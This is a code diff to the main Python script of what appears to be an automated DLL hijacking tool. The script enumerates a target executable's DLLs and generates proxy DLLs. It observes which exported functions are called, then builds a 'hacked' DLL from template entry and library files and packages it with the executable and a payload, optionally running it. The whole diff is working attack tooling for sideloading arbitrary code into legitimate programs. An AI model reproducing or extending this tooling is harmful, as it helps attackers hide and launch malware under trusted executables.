@@ -3,7 +3,7 @@ import os
 import pyuac
 import subprocess
 
-from utils.exe_analyzer import scan_exe_functions, behavior_analyze, select_scanned_dlls
+from utils.exe_analyzer import scan_exe_functions, behavior_analyze, select_scanned_functions
 from utils.dll_finder import get_dlls
 from utils.generator import gen_dll, gen_hacked_dll, export_out
 
@@ -13,21 +13,28 @@ def main():
         data = json.load(f)
 
     dlls = get_dlls(data["exe_path"], data["exe_args"])
-    called_functions = []
-    functions = ""
-    dll = ""
-    while not called_functions:
-        if len(dlls) == 0:
-            print(f"[Error]: No dll can be used")
-            return
-        dll = select_scanned_dlls(dlls)
-        functions = scan_exe_functions(data["exe_path"], dll)
-        gen_dll(functions, dll, data["vcvar_bat"])
 
-        called_functions = behavior_analyze(f"./temp/{os.path.basename(data['exe_path'])}", data["exe_args"], functions)
-        dlls.remove(dll)
-        if not called_functions:
-            print(f"[Error]: {dll} cannot be used")
+    dll_functions = {}
+    all_functions = []
+
+    for dll in dlls:
+        functions = scan_exe_functions(data["exe_path"], dll)
+        if len(functions) > 0:
+            for function in functions:
+                dll_functions.update({function: dll})
+            all_functions += functions
+            gen_dll(functions, dll, data["vcvar_bat"])
+
+    called_functions = behavior_analyze(f"./temp/{os.path.basename(data['exe_path'])}", data["exe_args"], all_functions)
+
+    called_dll_functions = {}
+    for function in called_functions:
+        called_dll_functions.update({function: dll_functions[function]})
+
+    if len(called_dll_functions) > 0:
+        hijacked_function, dll = select_scanned_functions(called_dll_functions)
+    else:
+        raise Exception("No functions selected")
 
     with open(f"{data['template']}/config.json", "r") as f:
         template_config = json.load(f)
@@ -35,10 +42,25 @@ def main():
     if not data["template"].endswith("/") or data["template"].endswith("\\"):
         data["template"] += "/"
 
-    gen_hacked_dll(functions, dll, called_functions[0], data["template"] + template_config["hack_lib"], data["vcvar_bat"])
+    hack_entry = data["template"] + template_config["hack_entry"]
+
+    hack_lib =  template_config["hack_lib"]
+    for i in range(len(hack_lib)):
+        hack_lib[i] = data["template"] + hack_lib[i]
+
+    extra_files =  template_config["extra_files"]
+    for i in range(len(extra_files)):
+        extra_files[i] = data["template"] + extra_files[i]
+
+    functions = []
+    for function in dll_functions:
+        if dll_functions[function] == dll:
+            functions.append(function)
+
+    gen_hacked_dll(functions, dll, hijacked_function, hack_entry, hack_lib, data["vcvar_bat"])
 
     files = [f"./temp/{os.path.basename(data['exe_path'])}"] + data["payload"]
-    export_out(template_config["extra_files"], files, data["template"])
+    export_out(extra_files, files)
 
     if data["run"]:
         os.chdir("./out")
@@ -57,5 +79,6 @@ if __name__ == "__main__":
         main()
     except Exception:
         import traceback
+
         traceback.print_exc()
     input("Press enter to end the program......")
